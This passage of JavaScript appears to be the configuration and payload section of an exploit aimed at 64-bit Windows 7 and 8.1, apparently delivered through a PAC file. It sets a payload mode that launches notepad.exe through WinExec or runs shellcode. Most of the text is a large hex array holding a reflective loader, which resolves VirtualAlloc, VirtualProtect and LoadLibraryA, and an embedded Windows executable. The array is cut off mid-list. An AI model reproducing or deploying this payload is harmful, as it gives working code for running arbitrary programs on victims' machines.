////////
////////
// Global settings
////////

var PayloadType = "shellcode"; // Can be "shellcode" or "winexec"
var CommandStr = "\u3a63\u775c\u6e69\u6f64\u7377\u6e5c\u746f\u7065\u6461\u652e\u6578"; // The ASCII string to be executed via WinExec if the relevant payload type is selected - C:\Windows\notepad.exe
var WindowsVersion = 8.1; // Can be 8.1 or 7. Only the 64-bit versions of these OS are supported.
var PacFile = true;
var EnableDebug = false;
var EnableTimers = false;
var AlertOutput = false;
var Shellcode = [ 0x000000e8, 0x89495900, 0xc18148c8, 0x00000b23, 0x627745ba, 0xc0814930, 0x00005d23, 0x0004b941, 0x48560000, 0x8348e689, 0x8348f0e4, 0x44c730ec, 0x00002024, 0x05e80000, 0x48000000, 0xc35ef489, 0x48c48b48, 0x44085889, 0x4c204889, 0x89184089, 0x56551050, 0x41544157, 0x41564155, 0x6c8d4857, 0x81489024, 0x000170ec, 0xff334500, 0x6bd845c7, 0x48006500, 0x894cf18b, 0x13b9f87d, 0x4cbdbf9c, 0x4cc87d89, 0x45087d89, 0x4c654f8d, 0x44107d89, 0x44bc4d88, 0x4ca24d88, 0x4c007d89, 0x4cf07d89, 0x44187d89, 0x44247d89, 0x2c247c89, 0x72dc45c7, 0xc7006e00, 0x0065e045, 0x45c7006c, 0x320033e4, 0xe845c700, 0x0064002e, 0x6cec45c7, 0xc7006c00, 0x53402444, 0xc665656c, 0x70442444, 0x582444c7, 0x64616f4c, 0x5c2444c7, 0x7262694c, 0x602444c7, 0x41797261, 0x482444c7, 0x74726956, 0x4c2444c7, 0x416c6175, 0x502444c7, 0x636f6c6c, 0x682444c7, 0x74726956, 0x6c2444c7, 0x506c6175, 0x702444c7, 0x65746f72, 0x2444c766, 0xc7746374, 0x6c46a845, 0x45c77375, 0x6e4968ac, 0xb045c773, 0x63757274, 0x74b445c7, 0xc76e6f69, 0x6143b845, 0x44c76863, 0x65477824, 0x44c74e74, 0x74617c24, 0x45c77669, 0x79536580, 0x8445c773, 0x496d6574, 0x8845c766, 0x45c6666e, 0x45c76f8a, 0x6c745290, 0x9445c741, 0x75466464, 0x6e9845c7, 0xc7697463, 0x6e6f9c45, 0xc7666154, 0x6c62a045, 0x00087fe8, 0x41b5b900, 0x8b485ed9, 0x0872e8d8, 0x8b4c0000, 0x458948e8, 0x458d48d0, 0x2045c7d8, 0x00180018, 0x244c8d4c, 0x45894838, 0x458d4c28, 0x33d23320, 0x48d3ffc9, 0x38244c8b, 0x24448d48, 0xc0334548, 0x24448948, 0x4d8d4c30, 0x2444c7c8, 0x0c000c28, 0x548d4800, 0xff412824, 0x4c8b48d5, 0x8d483824, 0x45682444, 0x8948c033, 0x4c302444, 0xc7004d8d, 0x0e282444, 0x48000e00, 0x2824548d, 0x48d5ff41, 0xc7a8458d, 0x15282444, 0x48001500, 0x38244c8b, 0x084d8d4c, 0x48c03345, 0x30244489, 0x24548d48, 0xd5ff4128, 0x244c8b48, 0x448d4838, 0x33457824, 0x448948c0, 0x8d4c3024, 0x44c7104d, 0x00132824, 0x8d480013, 0x41282454, 0x8b48d5ff, 0x4838244c, 0x4024448d, 0x48c03345, 0x30244489, 0xf04d8d4c, 0x282444c7, 0x00050005, 0x24548d48, 0xd5ff4128, 0x244c8b48, 0x458d4838, 0xc0334590, 0x24448948, 0x4d8d4c30, 0x2444c718, 0x13001328, 0x548d4800, 0xff412824, 0x4c8b48d5, 0x8d483824, 0x45582444, 0x8948c033, 0x4c302444, 0xc7f84d8d, 0x0c282444, 0x48000c00, 0x2824548d, 0x4cd5ff41, 0x0fc87d39, 0x00071d84, 0x7d394c00, 0x13840f00, 0x4c000007, 0x0ff07d39, 0x00070984, 0x7d394c00, 0xff840f08, 0x48000006, 0x4810558b, 0x840fd285, 0x000006f2, 0x3c7e6348, 0x81fe0348, 0x0045503f, 0xdf850f00, 0xb8000006, 0x00008664, 0x04473966, 0x06d0850f, 0x8d450000, 0x8444014f, 0x850f384f, 0x000006c2, 0x144fb70f, 0x48df8b41, 0x6624c183, 0x067f3b44, 0x0f442573, 0x480647b7, 0x3944cf03, 0x478b0479, 0x41450f38, 0x48010304, 0x3b28498d, 0xc3460fc3, 0x2b4dd88b, 0x48e375c1, 0xff384d8d, 0x3c558bd2, 0x44c28b44, 0xf7ff728d, 0x770344da, 0x488d4950, 0x4cc28bff, 0xc38bf023, 0x49c80348, 0x48ff408d, 0x2348d0f7, 0xf13b4cc8, 0x0654850f, 0x8b480000, 0xbc41304f, 0x00003000, 0x41c48b45, 0x000004b9, 0xd68b4900, 0x48c855ff, 0x8548d88b, 0x441275c0, 0x4504488d, 0x8b49c48b, 0xffc933d6, 0x8b48c855, 0xa58b44d8, 0x000000d0, 0x0001bb41, 0x84450000, 0x8b1d74e3, 0x43893c46, 0x3c568b3c, 0xca8b0beb, 0x8ad30341, 0x04883104, 0x54573b19, 0x19ebf072, 0x44d78b41, 0x76547f39, 0x41ca8b10, 0x048ad303, 0x19048831, 0x7254573b, 0x7b6348f0, 0xd78b453c, 0x48fb0348, 0x44307d89, 0x1447b70f, 0x28c08349, 0x7f3b4466, 0x4c3a7306, 0x8b45c703, 0x383945cf, 0x8b411f76, 0x8b410450, 0x8b41fc48, 0xcb0345c1, 0x48c80348, 0x048ad003, 0x19048832, 0x72083b45, 0x47b70fe1, 0xd3034506, 0x28c08349, 0x72d03b44, 0xf38b4cc9, 0x0002b841, 0x2b4c0000, 0x840f3077, 0x000000d6, 0xb4bf3944, 0x0f000000, 0x0000c984, 0x8f8b4400, 0x000000b0, 0x45cb034c, 0x840f3939, 0x000000b6, 0x08518d4d, 0x000091e9, 0xb70f4500, 0xb70f411a, 0xb70f41cb, 0xe9c166c3, 0xf983660c, 0x4529750a, 0x8141018b, 0x000fffe3, 0x048d4b00, 0x148b4818, 0x048d4b18, 0x01bb4118, 0x49000000, 0x8948d603, 0x8d451814, 0x4feb0143, 0x0001bb41, 0x83660000, 0x0e7503f9, 0x000fff25, 0x0c8d4800, 0xc68b4103, 0x41662eeb, 0x1575cb3b, 0x000fff25, 0x0c8d4800, 0xc68b4903, 0x10e8c148, 0xebc0b70f, 0x3b416613, 0x251475c8, 0x00000fff, 0x030c8d48, 0xc6b70f41, 0x48118b41, 0x4d0a0401, 0x8b41d003, 0x03490441, 0xd03b4cc1, 0xff5f850f, 0x8b4dffff, 0x3a3945ca, 0xff4a850f, 0x3944ffff, 0x000094bf, 0x82840f00, 0x8b000001, 0x0000908f, 0xef8b4500, 0x19048d4c, 0x0c408d49, 0x034507eb, 0x408d48eb, 0x38394414, 0x8b41f475, 0x04e083c4, 0x8bc04589, 0x89840fc1, 0x45000000, 0x860feb3b, 0x00000080, 0x10ecc141, 0xff5d8d45, 0x45d78b45, 0x7474db85, 0x41c88b4d, 0x007fffbe, 0x100f4100, 0x41d23301, 0x2b41cd8b, 0xfdf669ca, 0x41000343, 0xf1f7c68b, 0xc681d233, 0x00269ec3, 0x8b01488d, 0x10e8c1c6, 0xf7c62341, 0xc20341f1, 0x48c2ff41, 0x41800c8d, 0x1088548b, 0x0c100f41, 0x110f4188, 0x8b418804, 0x89411041, 0x41108844, 0x4109110f, 0x4d105189, 0x4514498d, 0xa172d33b, 0x0090878b, 0x04eb0000, 0xc0658b44, 0x0348f08b, 0x0c468bf3, 0x840fc085, 0x000000b1, 0x8bc07d8b, 0xcb0348c8, 0x48f855ff, 0x38244489, 0x44d08b4c, 0x8b44368b, 0x034c107e, 0xfb034cf3, 0x480e8b49, 0x5f74c985, 0x79c98548, 0xb70f4508, 0xebd23306, 0x538d4832, 0x48c03302, 0x0238d103, 0x8b480e74, 0xc1ff48ca, 0x80c0ff48, 0xf5750039, 0x24548948, 0xc0334530, 0x24548d48, 0x44896628, 0x89662824, 0x4d2a2444, 0x8b49cf8b, 0xd055ffca, 0x08c68349, 0x08c78349, 0x480e8b49, 0x0774c985, 0x24548b4c, 0x45a1eb38, 0xff85ff33, 0x83411074, 0x0a7601fd, 0xe8cc6941, 0xff000003, 0x468bf055, 0xc6834820, 0x0fc08514, 0xffff5685, 0x7d8b48ff, 0x6d8b4c30, 0xbf3944d0, 0x000000f4, 0x00a9840f, 0x8b440000, 0x0000f0bf, 0xc7834900, 0xfb034c04, 0x41e43345, 0xc085078b, 0x008a840f, 0xc88b0000, 0xffcb0348, 0x8948f855, 0x48382444, 0x8b41c88b, 0x8b450877, 0x03480c77, 0xf3034cf3, 0x7426394c, 0x168b495e, 0x79d28548, 0xb70f4408, 0xebd233c2, 0x438d4c34, 0xc48b4902, 0x45c2034c, 0x0e742038, 0x48d08b49, 0xff48c2ff, 0x223844c0, 0x894cf575, 0x48302444, 0x2824548d, 0x66c03345, 0x28244489, 0x24448966, 0xce8b4c2a, 0x48d5ff41, 0x4908c683, 0x4c08c683, 0x07742639, 0x244c8b48, 0x49a2eb38, 0xe920c783, 0xffffff6b, 0x0fff3345, 0x451477b7, 0x8348f78b, 0xbc4128c6, 0x00000001, 0x7f3b4466, 0x0b830f06, 0x48000001, 0x3944f703, 0xeb840f3e, 0x8b000000, 0xc88b1446, 0x0000e181, 0x17752000, 0x1ee0ba0f, 0xc0851172, 0x8b450d78, 0x648944c4, 0xa4e92024, 0x85000000, 0x0f3c75c9, 0x721ee0ba, 0x79c0850a, 0x418d4406, 0x8568eb08, 0x0f2875c9, 0x731ee0ba, 0x78c0850a, 0x418d4406, 0x8554eb02, 0x0f1475c9, 0x731ee0ba, 0x79c0850a, 0x418d4406, 0x8540eb04, 0x0f5f74c9, 0x721ee0ba, 0x78c0850c, 0x10b84108, 0xeb000000, 0x74c9852a, 0xe0ba0f49, 0x850c721e, 0x410879c0, 0x000080b8, 0x8514eb00, 0x0f3374c9, 0x731ee0ba, 0x78c08511, 0x20b8410d, 0x44000000, 0x20244489, 0xc98521eb, 0xba0f1874, 0x12731ee0, 0x24448b44, 0xb9c08520, 0x00000040, 0xc1480f44, 0x8b44ddeb, 0xf7202444, 0x00001446, 0x0a740400, 0xe8ba0f41, 0x44894409, 0x4e8b2024, 0x4c8d4cfc, 0x168b2024, 0xffcb0348, 0xb70f0055, 0x03450647, 0xc68348f4, 0xf03b4428, 0xfef8820f, 0x3345ffff, 0x48d233c0, 0xffffc983, 0x39440855, 0x0000d4bf, 0x8b247400, 0x0000d087, 0x748b4800, 0x0feb1818, 0x41c03345, 0x8b48d48b, 0x48d0ffcb, 0x4808768d, 0x8548068b, 0x4ce975c0, 0x4d184d8b, 0x2f74c985, 0x00a4878b, 0xc0850000, 0xc88b2574, 0x48c38b4c, 0xaaaaabb8, 0xaaaaaaaa, 0xe1f748aa, 0x00a08f8b, 0xc1480000, 0x034803ea, 0xd42b41cb, 0x8bd1ff41, 0x8b4d2847, 0xc30348c4, 0x48d48b41, 0xd0ffcb8b, 0x00b8b58b, 0xf6850000, 0x0097840f, 0x39440000, 0x00008cbf, 0x8a840f00, 0x8b000000, 0x0000888f, 0xcb034800, 0x18598b44, 0x74db8545, 0x79394478, 0x44727414, 0x4120498b, 0x518bff8b, 0xcb034c24, 0x45d30348, 0x5d74db85, 0x45018b45, 0x034cd78b, 0xeb5274c3, 0xc0be0f0d, 0x41d00344, 0x4d0dcac1, 0x8a41c403, 0x75c08400, 0xf23b41ec, 0x85480575, 0x411275d2, 0x8349fc03, 0x834804c1, 0x3b4102c2, 0xeb2273fb, 0x1c418bc3, 0x480ab70f, 0x958bc303, 0x000000c8, 0x88048b44, 0xc08d8b48, 0x4c000000, 0xff41c303, 0xc38b48d0, 0xc03302eb, 0x249c8b48, 0x000001b0, 0x70c48148, 0x41000001, 0x415e415f, 0x5f5c415d, 0xccc35d5e, 0x48c48b48, 0x48085889, 0x48106889, 0x48187089, 0x41207889, 0xec834856, 0x8b486510, 0x00602504, 0xe98b0000, 0x48f63345, 0x4c18508b, 0x4d104a8b, 0x4d30418b, 0x840fc085, 0x000000b3, 0x41100f41, 0x40634958, 0xd68b413c, 0xf3098b4d, 0x24047f0f, 0x009c8b46, 0x00000088, 0x74db8545, 0x048b48d2, 0xe8c14824, 0x3b446610, 0x482273f0, 0x08244c8b, 0xd0b70f44, 0xc101be0f, 0x39800dca, 0x83037c61, 0xd003e0c2, 0x49c1ff48, 0x7501ea83, 0x148d4fe7, 0xde8b4518, 0x207a8b41, 0x45f80349, 0x76187239, 0x41378b8e, 0x0349de8b, 0x7f8d48f0, 0x0ebe0f04, 0xc1c6ff48, 0xd9030dcb, 0xf175c984, 0x3b13048d, 0x410e74c5, 0x3b45c3ff, 0xd572185a, 0xffff5ee9, 0x428b41ff, 0x0c8d4324, 0xc003491b, 0x0114b70f, 0x1c4a8b41, 0x8bc80349, 0x03499104, 0x3302ebc0, 0x5c8b48c0, 0x8b482024, 0x4828246c, 0x3024748b, 0x247c8b48, 0xc4834838, 0xc35e4110, 0x00905a4d, 0x00000003, 0x00000004, 0x0000ffff, 0x000000b8, 0x00000000, 0x00000040, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x000000f0, 0x0eba1f0e, 0xcd09b400, 0x4c01b821, 0x685421cd, 0x70207369, 0x72676f72, 0x63206d61, 0x6f6e6e61, 0x65622074, 0x6e757220, 0x206e6920, 0x20534f44, 0x65646f6d, 0x0a0d0d2e, 0x00000024, 0x00000000, 0xd46ba654, 0x8705c710, 0x8705c710, 0x8705c710, 0x8796bf19, 0x8705c718, 0x8604b6ae, 0x8705c712, 0x8600b6ae, 0x8705c71b, 0x8601b6ae, 0x8705c718, 0x8606b6ae, 0x8705c713, 0x8604ac04, 0x8705c719, 0x8704c710, 0x8705c75d, 0x860db585, 0x8705c713, 0x87fab585, 0x8705c711, 0x8607b585, 0x8705c711, 0x68636952, 0x8705c710, 0x00000000, 0x00000000, 0x00004550, 0x00068664, 0x6079c3ec, 0x00000000, 0x00000000, 0x202200f0, 0x1c0e020b, 0x00001a00, 0x00003a00, 0x00000000, 0x00001e14, 0x00001000, 0x80000000, 0x00000001, 0x00001000, 0x00000200, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x0000a000, 0x00000400, 0x00000000, 0x01600003, 0x00100000, 0x00000000, 0x00001000, 0x00000000, 0x00100000, 0x00000000, 0x00001000, 0x00000000, 0x00000000, 0x00000010, 0x00000000, 0x00000000, 0x00004f14, 0x000000c8, 0x00008000, 0x000001e0, 0x00007000, 0x000002d0, 0x00000000, 0x00000000, 0x00009000, 0x00000118, 0x0000471c, 0x00000070, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00004790, 0x00000138, 0x00000000, 0x00000000, 0x00003000, 0x00000260, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x7865742e, 0x00000074, 0x000019a8, 0x00001000, 0x00001a00, 0x00000400, 0x00000000, 0x00000000, 0x00000000, 0x60000020, 0x6164722e, 0x00006174, 0x00002890, 0x00003000, 0x00002a00, 0x00001e00, 0x00000000, 0x00000000, 0x00000000, 0x40000040, 0x7461642e, 0x00000061, 0x00000650, 0x00006000, 0x00000200, 0x00004800, 0x00000000, 0x00000000, 0x00000000, 0xc0000040, 0x6164702e, 0x00006174, 0x000002d0, 0x00007000, 0x00000400, 0x00004a00, 0x00000000, 0x00000000, 0x00000000, 0x40000040, 0x7273722e, 0x00000063, 0x000001e0, 0x00008000, 0x00000200, 0x00004e00, 0x00000000, 0x00000000, 0x00000000, 0x40000040, 0x6c65722e, 0x0000636f, 0x00000118, 0x00009000, 0x00000200, 0x00005000, 0x00000000, 0x00000000, 0x00000000, 0x42000040, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x58ec8348, 0xfd058b48, 0x4800004f, 0x8948c433, 0x48402444, 0x3024448d, 0x48c18b4c, 0x28244489, 0x090d8d4c, 0x48000035, 0x3522158d, 0xc7480000, 0x00202444, 0x48000000, 0x35320d8d, 0x15ff0000, 0x0000213c, 0x4275c085, 0x244c8b48, 0x548d4830, 0x89483824, 0xff50245c, 0x00211b15, 0x4c8d4800, 0xd88b3024, 0x211e15ff, 0xdb850000, 0x245c8b48, 0x48177550, 0x3824448b, 0x244c8b48, 0xcc334840, 0x000a4be8, 0xc4834800, 0xc033c358, 0x244c8b48, 0xcc334840, 0x000a37e8, 0xc4834800, 0xccccc358, 0x38ec8348, 0x5d058b48, 0x4800004f, 0x8948c433, 0x48282444, 0x20244c8d, 0x24548948, 0xa515ff20, 0x48000020, 0x28244c8b, 0xe8cc3348, 0x00000a00, 0x38c48348, 0xccccccc3, 0xcccccccc, 0xcccccccc, 0xf925ff48, 0xcc000020, 0xcccccccc, 0xcccccccc, 0xe125ff48, 0xcc000020, 0xcccccccc, 0xcccccccc, 0x41058d48, 0xc3000055, 0xcccccccc, 0xcccccccc, 0x244c894c, 0x56555320, 0x48564157, 0x4940ec83, 0x8d4ce98b, 0x009024b4, 0x8b490000, 0xfa8b48f0, 0xe8d98b48, 0xffffffc8, 0x2474894c, 0xce8b4c30, 0x2444c748, 0x00000028, 0xc78b4c00, 0x48d38b48, 0x20246c89, 0xff088b48, 0x0020db15, 0xb9c08500, 0xffffffff, 0x48c1480f, 0x4140c483, 0x5d5e5f5e, 0xccccc35b, 0xcccccccc, 0xcccccccc, 0xcccccccc, 0x41565540, 0xec8b4857, 0x70ec8348, 0x75058b48, 0x4800004e, 0x8948c433, 0x3345f045, 0x45c748ff, 0xffffffc8, 0xf78b41ff, 0xc07d8944, 0x1f2615ff, 0x8b480000, 0x458d4cc8, 0x578d41c8, 0x6515ff28, 0x8500001e, 0xdb840fc0, 0x44000001, 0x48c04d8b, 0x48c0458d, 0x41c84d8b, 0x4503578d, 0x8948c033, 0xff202444, 0x001e7715, 0x0fc08500, 0x0001ab85, 0xb115ff00, 0x8300001e, 0x850f7af8, 0x0000019c, 0x249c8948, 0x00000090, 0x4cc05d8b, 0xa824b489, 0xff000000, 0x001e5715, 0xc38b4400, 0x08578d41, 0xffc88b48, 0x001e5715, 0x4d8b4400, 0x578d41c0, 0x4d8b4803, 0xf08b4cc8, 0xc0458d48, 0x48c68b4d, 0x20244489, 0x1e1615ff, 0xc0850000, 0x0126840f, 0x89480000, 0x009824bc, 0x8b410000, 0x3e3945ff, 0x010a860f, 0x894c0000, 0x00a024a4, 0x8d450000, 0xf6850167, 0x00ee850f, 0xc78b0000, 0xc44d8d4c, 0x44c03345, 0x48c47d89, 0x48d0558d, 0xf2400c8d, 0x44100f41, 0x8b41048e, 0x330c8e44, 0x110ff2c9, 0x4589d045, 0x6d15ffd8, 0x8500001d, 0xaa850fc0, 0xff000000, 0x001def15, 0x7af88300, 0x009b850f, 0x458b0000, 0x8bc0ffc4, 0xdb0348d8, 0xffc44589, 0x001d9b15, 0xc38b4c00, 0x4808568d, 0x15ffc88b, 0x00001d9c, 0xc44d8d4c, 0x8b4cc933, 0x558d48c0, 0xd88b48d0, 0x1d1e15ff, 0xc0850000, 0x8d485f74, 0x00336b15, 0xcb8b4800, 0x1f4215ff, 0xc0850000, 0x8b483775, 0x8d44d045, 0x8b48104e, 0x8d4cc84d, 0x894ce045, 0x3328247c, 0x458948d2, 0x658944e4, 0xec45c7e0, 0x00000002, 0x247c894c, 0xbd15ff20, 0x8500001c, 0x450f41c0, 0x2115fff4, 0x4c00001d, 0xd233c38b, 0xffc88b48, 0x001d8b15, 0x41c7ff00, 0x820f3e3b, 0xffffff0a, 0x24a48b4c, 0x000000a0, 0x24bc8b48, 0x00000098, 0x1cf215ff, 0x8b4d0000, 0x48d233c6, 0x15ffc88b, 0x00001d5c, 0x24b48b4c, 0x000000a8, 0x249c8b48, 0x00000090, 0xc84d8b48, 0x1cea15ff, 0xc68b0000, 0xf04d8b48, 0xe8cc3348, 0x0000071c, 0x70c48348, 0x5d5e5f41, 0xccccccc3, 0x245c8948, 0x81485710, 0x0004e0ec, 0x058b4800, 0x00004c34, 0x48c43348, 0xd0248489, 0x48000004, 0x570fd98b, 0x84110fc0, 0x00008824, 0x84110f00, 0x00009824, 0x2444c700, 0x00001070, 0x548d4800, 0x8d487024, 0x0088248c, 0x15ff0000, 0x00001c68, 0x840fc085, 0x00000151, 0xb841d233, 0x0000020a, 0x248c8d48, 0x000000b0, 0x00135fe8, 0x41d23300, 0x00020ab8, 0x8c8d4800, 0x0002c024, 0x134ae800, 0x570f0000, 0x44110fc0, 0xff337824, 0x247c8948, 0x848d4868, 0x00008824, 0x44894800, 0x8d4c2024, 0x0031bb0d, 0x0104ba00, 0x8b440000, 0x8c8d48c2, 0x0000b024, 0xfc96e800, 0x8948ffff, 0x4828245c, 0x8824848d, 0x48000000, 0x20244489, 0x9d0d8d4c, 0xba000031, 0x00000104, 0x48c28b44, 0xc0248c8d, 0xe8000002, 0xfffffc68, 0x247c8990, 0x448d4838, 0x89487824, 0x48302444, 0x28247c89, 0x24448d48, 0x44894868, 0x8d4c2024, 0x00b0248c, 0x33450000, 0x01578dc0, 0x150d8d48, 0xff000022, 0x001c8f15, 0x44894800, 0xc0855024, 0x89485c75, 0x8940247c, 0x4838247c, 0xc024848d, 0x48000002, 0x30244489, 0x28247c89, 0x202444c7, 0x00000100, 0x244c8b4c, 0xc0334568, 0x4841578d, 0x21d20d8d, 0x15ff0000, 0x00001c4c, 0x24448948, 0x4c8d4c58, 0x33456824, 0x1d578dc0, 0xb50d8d48, 0xff000021, 0x001c2f15, 0x44894800, 0x00eb6024, 0x247c8348, 0x19740068, 0x244c8d4c, 0xc0334568, 0x1d508d41, 0x8d0d8d48, 0xff000021, 0x001c0715, 0x48c03300, 0xd0248c8b, 0x48000004, 0x55e8cc33, 0x48000005, 0xf8249c8b, 0x48000004, 0x04e0c481, 0xc35f0000, 0xcccccccc, 0x245c8948, 0x8d485510, 0xf9e024ac, 0x8148ffff, 0x000720ec, 0x058b4800, 0x00004a5c, 0x48c43348, 0x06108589, 0x45c70000, 0x00000100, 0x48db3300, 0x702444c7, 0xffffffff, 0x2444c748, 0xffffff60, 0x5915ffff, 0x8500001a, 0x34840fc0, 0xff000002, 0x001abb15, 0x4c8d4c00, 0x33457024, 0xc88b48c0, 0x0f01ffba, 0x5d15ff00, 0x8500001a, 0x10840fc0, 0x48000002, 0x70244c8b, 0x24448d48, 0x44894860, 0x8d442824, 0x3345024b, 0x2444c7c0, 0x00000120, 0x01ffba00, 0x15ff000f, 0x00001a24, 0x840fc085, 0x000001d4, 0x8d48d233, 0xb841104d, 0x0000020a, 0x001147e8, 0xc9570f00, 0x245c8948, 0x48c03368, 0x02208d8d, 0x570f0000, 0x458948c0, 0x48d23388, 0x41f04589, 0x0003e8b8, 0x44110f00, 0x110f7824, 0x110f904d, 0x110fa04d, 0x110fb04d, 0x110fc04d, 0x110fd04d, 0x01e8e04d, 0x39000011, 0x1e74005d, 0x244c8b48, 0x4b8d4460, 0x458d4c04, 0x0c538d00, 0x196a15ff, 0xc0850000, 0x0167840f, 0x04ba0000, 0x48000001, 0xff104d8d, 0x001a0315, 0x0fc08500, 0x00013884, 0x548b4800, 0x8d486024, 0x4568244c, 0x15ffc033, 0x00001ac8, 0x840fc085, 0x0000011d, 0x69058d48, 0xc700002f, 0x00689045, 0x8d4c0000, 0x002fab05, 0x45894800, 0x01f4baa0, 0x8d480000, 0x0002208d, 0x3d15ff00, 0x4800001b, 0x60244c8b, 0x24448d48, 0x44894878, 0x8d4c5024, 0x00022085, 0x458d4800, 0xc9334590, 0x24448948, 0x48d23348, 0x4810458d, 0x40244489, 0x24448b48, 0x44894868, 0x44c73824, 0x04103024, 0x5c890000, 0x89482824, 0xff20245c, 0x0018e715, 0x75c08500, 0x4515ff7b, 0x3d000019, 0x00000522, 0x0084850f, 0x15ff0000, 0x00001894, 0x25058d4c, 0xba00002f, 0x000001f4, 0x208d8d48, 0xff000002, 0x001abb15, 0x4c8b4800, 0x8d486024, 0x48782444, 0x40244489, 0x208d8d4c, 0x48000002, 0x4590458d, 0x8948c033, 0x48382444, 0x4810458d, 0x30244489, 0x24448b48, 0x44894868, 0x8d412824, 0x44c70150, 0x04102024, 0x15ff0000, 0x0000184c, 0x1a74c085, 0x244c8b48, 0xad15ff78, 0x48000018, 0xff804d8b, 0x0018a315, 0x0001bb00, 0x8b480000, 0xff68244c, 0x0019ab15, 0x4c8b4800, 0x15ff6024, 0x00001888, 0x244c8b48, 0x7d15ff70, 0x8b000018, 0x8d8b48c3, 0x00000610, 0xe8cc3348, 0x000002ac, 0x249c8b48, 0x00000738, 0x20c48148, 0x5d000007, 0xccccccc3, 0xcccccccc, 0xcccccccc, 0xe8ec8148, 0x48000002, 0x47ba058b, 0x33480000, 0x848948c4, 0x0002d024, 0xf922e800, 0xc085ffff, 0x0220840f, 0x570f0000, 0xb48948c0, 0x0002f824, 0x48f63300, 0x68244c8d, 0x24748948, 0x44110f40, 0x15ff6824, 0x000018d8, 0x850fc085, 0x000001ee, 0x24548d48, 0x4c8d4840, 0x15ff6824, 0x000018f0, 0x850fc085, 0x000001d6, 0x249c8948, 0x000002f0, 0x245c8b48, 0xdb854840, 0x01b8840f, 0xd2330000, 0x248c8d48, 0x000000c0, 0x020ab841, 0xb9e80000, 0x0f00000e, 0x8948c057, 0x3320245c, 0x0d8d4cc0, 0x00002cdc, 0x000104ba, 0x84894800, 0x0000b024, 0xc28b4400, 0x24848948, 0x00000088, 0x248c8d48, 0x000000c0, 0x2484110f, 0x00000090, 0x2484110f, 0x000000a0, 0x2444110f, 0xf7f2e878, 0x568dffff, 0x8c8d4801, 0x00009024, 0x0915ff00, 0x85000017, 0x3f840fc0, 0x45000001, 0x8d4cc933, 0x00802484, 0x568d0000, 0x0d8d4801, 0x00002cac, 0x16f615ff, 0xc0850000, 0x011c840f, 0x8d480000, 0x45782444, 0x8948c033, 0x44382444, 0x890a4e8d, 0x48302474, 0xc0248c8d, 0xc7000000, 0x00282444, 0xba000008, 0x40000003, 0x202444c7, 0x00000800, 0x173e15ff, 0x8b480000, 0xc08548d8, 0x00d8840f, 0x570f0000, 0xbc8948c0, 0x0002e024, 0xc9334500, 0x24748948, 0xc0334548, 0x3301568d, 0x7f0ff3c9, 0xff502444, 0x0016f315, 0x548d4800, 0x8b484824, 0xf88b48cb, 0x24448948, 0x0515ff60, 0x85000017, 0x8b850fc0, 0xff000000, 0x0016bf15, 0x03e53d00, 0x7e750000, 0x244c8b4c, 0x058d4c40, 0xfffff9c4, 0x24748948, 0x33d23328, 0x247489c9, 0x7915ff20, 0xba000016, 0x00001388, 0xffcf8b48, 0x0016ab15, 0x75c08500, 0xcb8b483b, 0xfffb67e8, 0x74c085ff, 0x0d8d482f, 0x00002c8c, 0x165e15ff, 0xc0850000, 0x90661e75, 0x0001f4b9, 0x6515ff00, 0x48000016, 0x2c6e0d8d, 0x15ff0000, 0x00001640, 0xe474c085, 0xffcb8b48, 0x00162b15, 0xcf8b4800, 0x162215ff, 0x8b480000, 0x02e024bc, 0x8b480000, 0x02f0249c, 0x8b480000, 0x02f824b4, 0xc0330000, 0x248c8b48, 0x000002d0, 0xe8cc3348, 0x00000038, 0xe8c48148, 0xc3000002, 0x28ec8348, 0x7501fa83, 0xfd92e805, 0x01b8ffff, 0x48000000, 0xc328c483, 0xcccccccc, 0xcccccccc, 0xcccccccc, 0x6666cccc, 0x00841f0f, 0x00000000, 0x310d3b48, 0xf2000045, 0xc1481275, 0xf76610c1, 0xf2ffffc1, 0xc3f20275, 0x10c9c148, 0x000397e9, 0xcccccc00, 0x28ec8348, 0x3974d285, 0x7401ea83, 0x01ea8328, 0xfa831674, 0xb80a7401, 0x00000001, 0x28c48348, 0x0652e8c3, 0x05eb0000, 0x000623e8, 0xc0b60f00, 0x28c48348, 0xd08b49c3, 0x28c48348, 0x00000fe9, 0xc0854d00, 0x48c1950f, 0xe928c483, 0x00000118, 0x245c8948, 0x74894808, 0x89481024, 0x4120247c, 0xec834856, 0xf28b4820, 0x33f18b4c, 0x06c2e8c9, 0xc0840000, 0x00c8840f, 0x49e80000, 0x8a000005, 0x244488d8, 0x01b74040, 0x4a553d83, 0x0f000000, 0x0000c585, 0x4505c700, 0x0100004a, 0xe8000000, 0x00000594, 0x4f74c084, 0x0009a3e8, 0x04d6e800, 0xf5e80000, 0x48000004, 0x16ee158d, 0x8d480000, 0x0016df0d, 0x0bdae800, 0xc0850000, 0x31e82975, 0x84000005, 0x482074c0, 0x16be158d, 0x8d480000, 0x0016af0d, 0x0bb4e800, 0x05c70000, 0x000049f0, 0x00000002, 0x8aff3240, 0x07a6e8cb, 0x84400000, 0xe83f75ff, 0x000007ec, 0x48d88b48, 0x74003883, 0xc88b4824, 0x0006f3e8, 0x74c08400, 0xc68b4c18, 0x000002ba, 0xce8b4900, 0x4c038b48, 0x164a0d8b, 0xff410000, 0x1105ffd1, 0xb8000044, 0x00000001, 0xc03302eb, 0x245c8b48, 0x748b4830, 0x8b483824, 